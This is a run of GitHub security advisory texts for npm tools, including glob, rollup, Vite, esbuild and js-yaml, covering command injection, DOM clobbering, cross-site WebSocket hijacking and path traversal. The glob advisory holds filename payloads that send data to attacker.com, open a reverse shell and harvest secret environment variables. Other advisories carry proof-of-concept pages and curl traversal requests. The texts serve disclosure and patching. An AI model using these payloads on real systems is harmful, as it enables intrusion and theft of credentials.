The exploitability depends on the specific details of the underlying Prototype Pollution issue.\n\n> [!NOTE]\n> This advisory does not indicate the presence of a Prototype Pollution within the Sentry SDK itself. Users are strongly advised to first address any Prototype Pollution vulnerabilities in their application, as they pose a more critical security risk.\n\n### Patches\nThe issue was patched in all Sentry JavaScript SDKs starting from the [8.33.0](https:\/\/github.com\/getsentry\/sentry-javascript\/releases\/tag\/8.33.0) version.\nAlso, the fix was backported to SDK v7 in [7.119.1](https:\/\/github.com\/getsentry\/sentry-javascript\/releases\/tag\/7.119.1).\n\n### References\n* [Prototype Pollution](https:\/\/portswigger.net\/web-security\/prototype-pollution)\n* [Prototype Pollution gadgets](https:\/\/portswigger.net\/web-security\/prototype-pollution#prototype-pollution-gadgets)\n* [sentry-javascript#13838](https:\/\/github.com\/getsentry\/sentry-javascript\/pull\/13838)",

The attacker serves a malicious web page (`http:\/\/malicious.example.com`).\n1. The user accesses the malicious web page.\n1. The attacker sends a `fetch('http:\/\/127.0.0.1:8000\/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n1. The attacker gets the content of `http:\/\/127.0.0.1:8000\/main.js`.\n\nIn this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by\n\n- Fetching `\/index.html`: normally you have a script tag here\n- Fetching `\/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files\n- Connecting `\/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('\/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)\n- Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file\n\nThe scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.\n\n### PoC\n\n1. Download [reproduction.zip](https:\/\/github.com\/user-attachments\/files\/18561484\/reproduction.zip)\n2. Extract it and move to that directory\n1. Run `npm i`\n1. Run `npm run watch`\n1. Run `fetch('http:\/\/127.0.0.1:8000\/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.\n\n![image](https:\/\/github.com\/user-attachments\/assets\/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)\n\n### Impact\n\nUsers using the serve feature may get the source code stolen by malicious websites.",

                    "description": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c\/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src\/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams\/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI\/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode \/path\/to\/glob\/dist\/esm\/bin.mjs -c echo \"**\/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https:\/\/attacker.com\/exfil -d \"$(whoami):$(pwd)\" > \/dev\/null 2>&1)\ntouch '$(curl -X POST https:\/\/attacker.com\/exfil -d \"$(whoami):$(pwd)\" > \/dev\/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& \/dev\/tcp\/attacker.com\/4444 0>&1)\ntouch '$(bash -i >& \/dev\/tcp\/attacker.com\/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > \/tmp\/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > \/tmp\/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI\/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX\/Linux\/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src\/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c\/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c\/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`\/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",

All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps:\/\/cheatsheetseries.owasp.org\/cheatsheets\/Prototype_Pollution_Prevention_Cheat_Sheet.html",

The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https:\/\/github.com\/micromatch\/micromatch\/pull\/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",

                    "description": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`\/`umd`\/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nIt's worth noting that we\u2019ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https:\/\/github.com\/webpack\/webpack\/security\/advisories\/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https:\/\/scnps.co\/papers\/sp23_domclob.pdf\n[2] https:\/\/research.securitum.com\/xss-in-amp4email-dom-clobbering\/\n\n#### Gadget found in `rollup`\n\nWe have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`\/`umd`\/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.\n\nhttps:\/\/github.com\/rollup\/rollup\/blob\/b86ffd776cfa906573d36c3f019316d02445d9ef\/src\/ast\/nodes\/MetaProperty.ts#L157-L162\n\nhttps:\/\/github.com\/rollup\/rollup\/blob\/b86ffd776cfa906573d36c3f019316d02445d9ef\/src\/ast\/nodes\/MetaProperty.ts#L180-L185\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.\n\n```\nvar s = document.createElement('script')\ns.src = import.meta.url + 'extra.js'\ndocument.head.append(s)\n```\n\nThe output `bundle.js` is shown in the following code snippet.\n\n```\n'use strict';\n\nvar _documentCurrentScript = typeof document !== 'undefined' ? document.currentScript : null;\nvar s = document.createElement('script');\ns.src = (typeof document === 'undefined' ? require('u' + 'rl').pathToFileURL(__filename).href : (_documentCurrentScript && False && _documentCurrentScript.src || new URL('bundle.js', document.baseURI).href)) + 'extra.js';\ndocument.head.append(s);\n```\n\nAdding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>rollup Example<\/title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https:\/\/attacker.controlled.server\/\"><\/img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n<\/head>\n<script type=\"module\" crossorigin src=\"bundle.js\"><\/script>\n<body>\n<\/body>\n<\/html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.\n\n### Patch\n\nPatching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.\n\n```\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n\tgetResolveUrl(\n\t\t`'${escapeId(relativePath)}', ${\n\t\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t\t}document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`\n\t);\n```\n\n```\nconst getUrlFromDocument = (chunkId: string, umd = false) =>\n\t`${\n\t\tumd ? `typeof document === 'undefined' ? location.href : ` : ''\n\t}(${DOCUMENT_CURRENT_SCRIPT} && ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === 'SCRIPT' &&${DOCUMENT_CURRENT_SCRIPT}.src || new URL('${escapeId(\n\t\tchunkId\n\t)}', document.baseURI).href)`;\n```\n",

Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.\n\n#### Using a reverse proxy in front of Vite\nIf you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https:\/\/vite.dev\/config\/server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http:\/\/vite:5173`, you need to add `vite` to the `server.allowedHosts` option.\n\n#### Accessing the development server via a domain other than `localhost` or `*.localhost`\nYou need to add the hostname to the new [`server.allowedHosts`](https:\/\/vite.dev\/config\/server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http:\/\/foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.\n\n#### Using a plugin \/ framework that connects to the WebSocket server on their own from the browser\nIf you are using a plugin \/ framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin \/ framework may have a code that connects to the WebSocket server on their own from the browser.\n\nIn that case, you can either:\n\n- fix the plugin \/ framework code to the make it compatible with the new version of Vite\n- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin \/ framework is incompatible with the new version of Vite\n  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.\n\n### Mitigation without upgrading Vite\n#### [1]: Permissive default CORS settings\nSet `server.cors` to `false` or limit `server.cors.origin` to trusted origins.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nThere aren't any mitigations for this.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUse Chrome 94+ or use HTTPS for the development server.\n\n### Details\n\nThere are three causes that allowed malicious websites to send any requests to the development server:\n\n#### [1]: Permissive default CORS settings\n\nVite sets the [`Access-Control-Allow-Origin`](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/HTTP\/Headers\/Access-Control-Allow-Origin) header depending on [`server.cors`](https:\/\/vite.dev\/config\/server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http:\/\/malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker sends a `fetch('http:\/\/127.0.0.1:5173\/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.\n4. The attacker gets the content of `http:\/\/127.0.0.1:5173\/main.js`.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n\nVite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https:\/\/github.com\/vitejs\/vite\/blob\/v6.0.7\/packages\/vite\/src\/node\/server\/ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https:\/\/github.com\/vitejs\/vite\/blob\/v6.0.7\/packages\/vite\/types\/hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.\n\nAttack scenario:\n\n1. The attacker serves a malicious web page (`http:\/\/malicious.example.com`).\n2. The user accesses the malicious web page.\n3. The attacker runs `new WebSocket('http:\/\/127.0.0.1:5173', 'vite-hmr')` by JS in that malicious web page.\n4. The user edits some files.\n5. Vite sends some HMR messages over WebSocket.\n6. The attacker gets the content of the HMR messages.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\n\nUnless [`server.https`](https:\/\/vite.dev\/config\/server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.\n\n1. The attacker serves a malicious web page that is served on **HTTP** (`http:\/\/malicious.example.com:5173`) (HTTPS won't work).\n2. The user accesses the malicious web page.\n3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).\n4. The attacker sends a `fetch('\/main.js')` request by JS in that malicious web page.\n5. The attacker gets the content of `http:\/\/127.0.0.1:5173\/main.js` bypassing the same origin policy.\n\n### Impact\n#### [1]: Permissive default CORS settings\nUsers with the default `server.cors` option may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\n#### [2]: Lack of validation on the Origin header for WebSocket connections\nAll users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.\n\nFor users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.\n\nFor users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.\n\n#### [3]: Lack of validation on the Host header for HTTP requests\nUsers using HTTP for the development server and using a browser that is not Chrome 94+ may:\n\n- get the source code stolen by malicious websites\n- give the attacker access to functionalities that are not supposed to be exposed externally\n  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.\n\nChrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https:\/\/developer.chrome.com\/blog\/private-network-access-update#chrome_94) since Chrome 94.\n\n### Related Information\nSafari has [a bug that blocks requests to loopback addresses from HTTPS origins](https:\/\/bugs.webkit.org\/show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of \"the malicious web page is served on HTTP\" to make [1] and [2] to work.\n\n### PoC\n#### [2]: Lack of validation on the Origin header for WebSocket connections\n1. I used the `react` template which utilizes HMR functionality.\n\n```\nnpm create vite@latest my-vue-app-react -- --template react\n```\n\n2. Then on a malicious server, serve the following POC html:\n```html\n<!doctype html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"utf-8\" \/>\n        <title>vite CSWSH<\/title>\n    <\/head>\n    <body>\n        <div id=\"logs\"><\/div>\n        <script>\n            const div = document.querySelectorAll('#logs')[0];\n            const ws = new WebSocket('ws:\/\/localhost:5173','vite-hmr');\n            ws.onmessage = event => {\n                const logLine = document.createElement('p');\n                logLine.innerHTML = event.data;\n                div.append(logLine);\n            };\n        <\/script>\n    <\/body>\n<\/html>\n```\n\n3. Kick off Vite \n\n```\nnpm run dev\n```\n\n4. Load the development server (open `http:\/\/localhost:5173\/`) as well as the malicious page in the browser. \n5. Edit `src\/App.jsx` file and intentionally place a syntax error\n6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed\n\nHere's a video demonstrating the POC:\n\nhttps:\/\/github.com\/user-attachments\/assets\/a4ad05cd-0b34-461c-9ff6-d7c8663d6961",

                    "description": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`\/`iife`\/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.\n\nNote that, we have identified similar security issues in Webpack: https:\/\/github.com\/webpack\/webpack\/security\/advisories\/GHSA-4vvj-4cpr-p986\n\n### Details\n\n**Backgrounds**\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https:\/\/scnps.co\/papers\/sp23_domclob.pdf\n[2] https:\/\/research.securitum.com\/xss-in-amp4email-dom-clobbering\/\n\n**Gadgets found in Vite**\n\nWe have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.\n\nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.\n\n```\nconst relativeUrlMechanisms = {\n  amd: (relativePath) => {\n    if (relativePath[0] !== \".\") relativePath = \".\/\" + relativePath;\n    return getResolveUrl(\n      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`\n    );\n  },\n  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath)})`,\n  es: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`\n  ),\n  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),\n  \/\/ NOTE: make sure rollup generate `module` params\n  system: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', module.meta.url`\n  ),\n  umd: (relativePath) => `(typeof document === 'undefined' && typeof location === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath, true)})`\n};\n```\n\n### PoC\n\nConsidering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. \n\n```\n\/\/ main.js\nimport extraURL from '.\/extra.js?url'\nvar s = document.createElement('script')\ns.src = extraURL\ndocument.head.append(s)\n```\n\n```\n\/\/ extra.js\nexport default \"https:\/\/myserver\/justAnOther.js\"\n```\n\n```\n\/\/ vite.config.js\nimport { defineConfig } from 'vite'\n\nexport default defineConfig({\n  build: {\n    assetsInlineLimit: 0, \/\/ To avoid inline assets for PoC\n    rollupOptions: {\n      output: {\n        format: \"cjs\"\n      },\n    },\n  },\n  base: \".\/\",\n});\n```\n\nAfter running the build command, the developer will get following bundle as the output.\n\n```\n\/\/ dist\/index-DDmIg9VD.js\n\"use strict\";const t=\"\"+(typeof document>\"u\"?require(\"url\").pathToFileURL(__dirname+\"\/extra-BLVEx9Lb.js\").href:new URL(\"extra-BLVEx9Lb.js\",document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement(\"script\");e.src=t;document.head.append(e);\n```\n\nAdding the Vite bundled script, `dist\/index-DDmIg9VD.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Vite Example<\/title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https:\/\/attacker.controlled.server\/\"><\/img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n<\/head>\n<script type=\"module\" crossorigin src=\"\/assets\/index-DDmIg9VD.js\"><\/script>\n<body>\n<\/body>\n<\/html>\n```\n\n### Impact\n\nThis vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes.\n\n### Patch\n\n```\n\/\/ https:\/\/github.com\/vitejs\/vite\/blob\/main\/packages\/vite\/src\/node\/build.ts#L1296\nconst getRelativeUrlFromDocument = (relativePath: string, umd = false) =>\n  getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', ${\n      umd ? `typeof document === 'undefined' ? location.href : ` : ''\n    }document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src || document.baseURI`,\n  )\n```",

It returns the [viteServePublicMiddleware](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/static.ts#L106) function which runs the needed tests and serves the page. The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https:\/\/github.com\/lukeed\/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https:\/\/github.com\/lukeed\/sirv\/blob\/d061616827dd32d53b61ec9530c9445c8f592620\/packages\/sirv\/index.mjs#L42). For example, if the public directory is \"\/www\/public\", and the requested file is \"myfile\", the code will join them to the string \"\/www\/public\/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https:\/\/github.com\/lukeed\/sirv\/blob\/d061616827dd32d53b61ec9530c9445c8f592620\/packages\/sirv\/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https:\/\/github.com\/lukeed\/sirv\/blob\/d061616827dd32d53b61ec9530c9445c8f592620\/packages\/sirv\/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"\/www\", and the public directory is at \"\/www\/p\", if the created path will be \"\/www\/private.txt\", the startsWith function will still return true, because the string \"\/www\/private.txt\" starts with\u00A0 \"\/www\/p\". To achieve this, the attacker will use \"..\" to ask for the file \"..\/private.txt\". The code will then join it to the \"\/www\/p\" string, and will receive \"\/www\/p\/..\/private.txt\". Then, the normalize function will return \"\/www\/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project\/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p\/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho  \"secret\" > private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http:\/\/localhost:5173\/private.txt'`\n\nYou will receive a 403 HTTP Response,\u00A0 because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http:\/\/localhost:5173\/..\/private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https:\/\/github.com\/lukeed\/sirv\/commit\/f0113f3f8266328d804ee808f763a3c11f8997eb",

The preview server allowed HTML files not under the output directory to be served.\n\n### Details\nThe [serveStaticMiddleware](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/static.ts#L123) function is in charge of serving static files from the server. It returns the [viteServeStaticMiddleware](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/static.ts#L136) function which runs the needed tests and serves the page. The viteServeStaticMiddleware function [checks if the extension of the requested file is \".html\"](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/static.ts#L144). If so, it doesn't serve the page. Instead, the server will go on to the next middlewares, in this case [htmlFallbackMiddleware](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/htmlFallback.ts#L14), and then to [indexHtmlMiddleware](https:\/\/github.com\/vitejs\/vite\/blob\/9719497adec4ad5ead21cafa19a324bb1d480194\/packages\/vite\/src\/node\/server\/middlewares\/indexHtml.ts#L438). These middlewares don't perform any test against allow or deny rules, and they don't make sure that the accessed file is in the root directory of the server. They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project\/\necho  \"secret\" > \/tmp\/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http:\/\/localhost:5173\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/tmp\/secret.html'`\n\nThe contents of \/tmp\/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files\/*\")]}}})'  >  [vite.config.js](http:\/\/vite.config.js)\nmkdir secret_files\necho \"secret txt\" > secret_files\/secret.txt\necho \"secret html\" > secret_files\/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http:\/\/localhost:5173\/secret_files\/secret.txt'`\n\nYou will receive a 403 HTTP Response,\u00A0 because everything in the secret_files directory is denied.\n\nNow in the same shell run the 